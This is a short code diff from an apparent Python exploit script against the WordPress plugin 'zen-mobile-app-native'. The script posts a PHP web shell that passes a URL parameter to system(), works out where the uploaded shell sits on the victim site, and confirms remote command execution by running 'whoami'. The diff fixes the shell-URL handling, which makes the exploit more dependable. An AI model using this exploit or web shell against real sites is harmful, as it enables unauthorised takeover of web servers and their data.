@@ -27,7 +27,8 @@ def exploit():
 	myShell = {'file': (shellName, '<?php echo system($_GET[\'alien\']); ?>')}
 	shellEmUp = requests.post(target, files=myShell)
 	respShell = shellEmUp.text
-	shellLoc = respShell.replace("http://example.com/", victim+"/wp-content/plugins/zen-mobile-app-native/")
+	cleanURL = respShell.replace("http://example.com/",victim+"/wp-content/plugins/zen-mobile-app-native/")
+	shellLoc = cleanURL.replace(" ", "")
 	print "Confirming shell upload by printing current user\n"
 	shellTest=requests.get(shellLoc+"?alien=whoami")
 	webserverUser=shellTest.text
